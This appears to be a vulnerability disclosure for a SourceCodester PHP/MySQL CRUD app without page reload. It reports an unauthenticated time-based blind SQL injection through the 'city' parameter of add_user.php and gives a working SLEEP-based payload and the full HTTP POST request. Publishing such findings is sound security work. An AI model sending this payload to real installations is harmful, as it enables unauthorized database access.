# CRUD (Create, Read, Update, Delete) Without Page Reload/Refresh Using PHP and MySQL with Source Code - SQL injection vulnerability

### You do not need to log in to the website to remotely trigger SQL injection vulnerabilities!

Supplier:https://www.sourcecodester.com/php/17146/crud-create-read-update-delete-without-page-reloadrefresh-using-php-and-mysql-source-code

http://localhost//add_user.php   -----> POST -----> 'city' can control some city parameters

Payload:username=1&email=2&mobile=3&city=4' AND (SELECT * FROM (SELECT(SLEEP(10)))a) AND '1'='1

Running this load will result in a 10 second delay in the database execution. This indicates that the malicious SQL statement has been successfully executed in the database, allowing for time based SQL blind injection queries in the database.

```r
POST /add_user.php HTTP/1.1
Host: www.crud-without-refresh-reload.com:8088
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

username=1&email=2&mobile=3&city=4' AND (SELECT * FROM (SELECT(SLEEP(10)))a) AND '1'='1
```

![1](/img/CRUD/1.png)

The 6th line of the add_user.php file<? The PHP method retrieves user input from the POST element. Then, the value of this element will be passed to the code without proper purification or validation, and ultimately in line 9 of the add_user.php file<? Used for database queries in PHP methods. This leads to SQL injection attacks.

![2](/img/CRUD/2.png)
